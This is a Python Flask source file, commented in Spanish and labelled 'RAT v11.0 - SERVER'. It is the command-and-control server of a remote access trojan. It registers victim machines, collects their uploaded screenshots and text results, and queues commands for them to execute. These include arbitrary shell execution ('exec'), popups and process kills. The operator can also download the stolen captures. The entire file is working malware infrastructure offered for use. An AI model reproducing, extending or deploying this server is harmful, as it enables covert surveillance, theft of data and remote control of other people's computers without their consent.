from flask import Flask, render_template, request, jsonify, send_file
import json
import uuid
from datetime import datetime
import io
import base64
import os

app = Flask(__name__)

clients = {}
command_queue = {}
results_store = {}
command_history = {}

# ============================================================
# CONVERSIÓN BMP A PNG
# ============================================================
def bmp_to_png_base64(bmp_base64):
    try:
        from PIL import Image
        bmp_data = base64.b64decode(bmp_base64)
        if len(bmp_data) < 54:
            return bmp_base64
        
        # Cabecera BMP
        width = int.from_bytes(bmp_data[18:22], 'little')
        height = int.from_bytes(bmp_data[22:26], 'little')
        bit_count = int.from_bytes(bmp_data[28:30], 'little')
        
        # Offset de datos
        offset = 54
        if bmp_data[0:2] == b'BM':
            offset = int.from_bytes(bmp_data[10:14], 'little')
        
        # Tamaño de imagen
        image_size = int.from_bytes(bmp_data[34:38], 'little')
        if image_size == 0:
            row_size = ((width * bit_count + 31) // 32) * 4
            image_size = row_size * abs(height)
        
        pixel_data = bmp_data[offset:offset+image_size]
        
        # Crear imagen
        if bit_count == 24:
            img = Image.frombytes('RGB', (width, abs(height)), pixel_data, 'raw', 'BGR')
        elif bit_count == 32:
            img = Image.frombytes('RGBA', (width, abs(height)), pixel_data, 'raw', 'BGRA')
            img = img.convert('RGB')
        else:
            return bmp_base64
        
        if height < 0:
            img = img.transpose(Image.FLIP_TOP_BOTTOM)
        
        output = io.BytesIO()
        img.save(output, format='PNG')
        return base64.b64encode(output.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"Error converting BMP: {e}")
        return bmp_base64

# ============================================================
# RUTAS
# ============================================================

@app.route('/')
def index():
    return render_template('dashboard.html')

@app.route('/api/clients/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        client_id = data.get('client_id', str(uuid.uuid4())[:8])
        if client_id not in clients:
            clients[client_id] = {
                'ip': request.remote_addr,
                'hostname': data.get('hostname', 'Unknown'),
                'os': data.get('os', 'Windows'),
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'status': 'online',
                'captures': []
            }
        else:
            clients[client_id]['last_seen'] = datetime.now().isoformat()
            clients[client_id]['status'] = 'online'
        if client_id not in command_queue:
            command_queue[client_id] = []
        if client_id not in results_store:
            results_store[client_id] = []
        if client_id not in command_history:
            command_history[client_id] = []
        return jsonify({'status': 'ok', 'client_id': client_id})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/api/clients/upload', methods=['POST'])
def upload():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        image_data = data.get('data')
        result_type = data.get('type', 'screen')
        
        if client_id and image_data and client_id in clients:
            if result_type == 'screen':
                # Convertir BMP a PNG para mostrar
                png_data = bmp_to_png_base64(image_data)
                clients[client_id]['captures'].append({
                    'timestamp': datetime.now().isoformat(),
                    'data': png_data,
                    'raw_data': image_data,
                    'type': result_type
                })
                print(f"Screenshot from {client_id} saved")
            else:
                # Para resultados de texto
                clients[client_id]['captures'].append({
                    'timestamp': datetime.now().isoformat(),
                    'data': image_data,
                    'type': result_type
                })
                try:
                    decoded = base64.b64decode(image_data).decode('utf-8', errors='ignore')
                    filename = f"{result_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    results_store[client_id].append({
                        'type': result_type,
                        'timestamp': datetime.now().isoformat(),
                        'data': decoded,
                        'filename': filename
                    })
                    if len(results_store[client_id]) > 50:
                        results_store[client_id] = results_store[client_id][-50:]
                except:
                    pass
            
            if len(clients[client_id]['captures']) > 50:
                clients[client_id]['captures'] = clients[client_id]['captures'][-50:]
            clients[client_id]['last_seen'] = datetime.now().isoformat()
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/api/clients/<client_id>/cmd/poll', methods=['GET'])
def poll(client_id):
    if client_id in command_queue and command_queue[client_id]:
        cmd = command_queue[client_id].pop(0)
        if client_id not in command_history:
            command_history[client_id] = []
        command_history[client_id].append({'cmd': cmd, 'time': datetime.now().isoformat()})
        return jsonify({'command': cmd, 'id': len(command_history[client_id])})
    return jsonify({'command': None})

@app.route('/api/clients/<client_id>/cmd/result', methods=['POST'])
def cmd_result(client_id):
    try:
        data = request.get_json()
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'ok'})

@app.route('/get_clients', methods=['GET'])
def get_clients():
    result = {}
    for cid, info in clients.items():
        result[cid] = {
            'ip': info['ip'],
            'hostname': info['hostname'],
            'os': info['os'],
            'last_seen': info['last_seen'],
            'status': info['status'],
            'capture_count': len(info['captures'])
        }
    return jsonify(result)

@app.route('/get_captures/<client_id>', methods=['GET'])
def get_captures(client_id):
    if client_id in clients:
        return jsonify(clients[client_id]['captures'])
    return jsonify([])

@app.route('/send_cmd', methods=['POST'])
def send_cmd():
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        cmd = data.get('cmd')
        if client_id and cmd:
            if client_id not in command_queue:
                command_queue[client_id] = []
            command_queue[client_id].append(cmd)
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/get_results/<client_id>', methods=['GET'])
def get_results(client_id):
    if client_id in results_store:
        return jsonify(results_store[client_id])
    return jsonify([])

@app.route('/get_history/<client_id>', methods=['GET'])
def get_history(client_id):
    if client_id in command_history:
        return jsonify(command_history[client_id])
    return jsonify([])

@app.route('/download_result/<client_id>/<int:index>', methods=['GET'])
def download_result(client_id, index):
    try:
        if client_id in results_store and index < len(results_store[client_id]):
            item = results_store[client_id][index]
            filename = item.get('filename', f"result_{index}.txt")
            content = item.get('data', 'Sin contenido')
            return send_file(
                io.BytesIO(content.encode('utf-8')),
                as_attachment=True,
                download_name=filename,
                mimetype='text/plain; charset=utf-8'
            )
        return "Error", 404
    except:
        return "Error", 500

@app.route('/download_screenshot/<client_id>/<int:index>', methods=['GET'])
def download_screenshot(client_id, index):
    try:
        if client_id in clients:
            captures = clients[client_id]['captures']
            if index < len(captures):
                raw = captures[index].get('raw_data')
                if raw:
                    binary = base64.b64decode(raw)
                else:
                    binary = base64.b64decode(captures[index]['data'])
                return send_file(
                    io.BytesIO(binary),
                    as_attachment=True,
                    download_name=f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bmp",
                    mimetype='image/bmp'
                )
        return "Error", 404
    except:
        return "Error", 500

@app.route('/exec_cmd/<client_id>', methods=['POST'])
def exec_cmd(client_id):
    try:
        data = request.get_json()
        cmd = data.get('cmd')
        if cmd:
            if client_id not in command_queue:
                command_queue[client_id] = []
            command_queue[client_id].append(f"exec|{cmd}")
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/notify/<client_id>', methods=['POST'])
def notify(client_id):
    try:
        data = request.get_json()
        msg = data.get('message', '')
        if msg:
            if client_id not in command_queue:
                command_queue[client_id] = []
            command_queue[client_id].append(f"popup|{msg}")
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/kill/<client_id>', methods=['POST'])
def kill_process(client_id):
    try:
        data = request.get_json()
        target = data.get('target', '')
        if target:
            if client_id not in command_queue:
                command_queue[client_id] = []
            command_queue[client_id].append(f"kill|{target}")
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'error'}), 400
    except:
        return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    print("=" * 50)
    print("RAT v11.0 - SERVER")
    print("=" * 50)
    print("Port: 5000")
    print("URL: http://localhost:5000")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=False)